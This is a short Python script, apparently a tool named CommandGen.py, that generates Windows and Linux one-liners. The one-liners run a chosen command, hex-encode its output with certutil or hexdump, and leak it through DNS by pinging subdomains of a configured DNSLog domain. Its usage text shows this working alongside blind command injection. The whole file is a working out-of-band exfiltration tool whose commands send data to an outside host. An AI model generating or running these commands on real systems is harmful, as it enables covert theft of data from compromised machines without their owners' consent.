import sys

commandTemWin = r'del command7 && del command7.txt && command > command7 &&echo 11111111111>>command7 && certutil -encodehex command7 command7.txt && for /f "tokens=1-17" %a in (command7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.{0}'
commandTemLinux = r'rm -f command7;rm -f command7.txt;command > command7 &&echo 11111111111 >>command7 && cat command7|hexdump -C > command7.txt && cat command7.txt |sed s/[[:space:]]//g | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.command.{0}; done'

with open('config617', 'r') as f:
    domain = f.readlines()[0]
    commandWin = commandTemWin.format(domain)
    commandLinux = commandTemLinux.format(domain)

if __name__ == '__main__':
    if len(sys.argv)<2:
        print('usage: python3 CommandGen.py Yourcommand No(start)')
        print('like: python3 CommandGen.py whoami (Command will use "start".Start will Send a large number of requests in a short period of time, resulting in lost DNSLog record)')
        print('like: python3 CommandGen.py whoami no (Will No start)')
        sys.exit(0)
    if len(sys.argv) == 2:
        print("\n\nWindows:\n")
        print(commandWin.replace('command',sys.argv[1]))
        print("\n\nLinux:\n")
        print(commandLinux.replace('command',sys.argv[1]))
    if len(sys.argv) == 3:
        print(commandWin.replace('command',sys.argv[1]).replace('start /b',''))
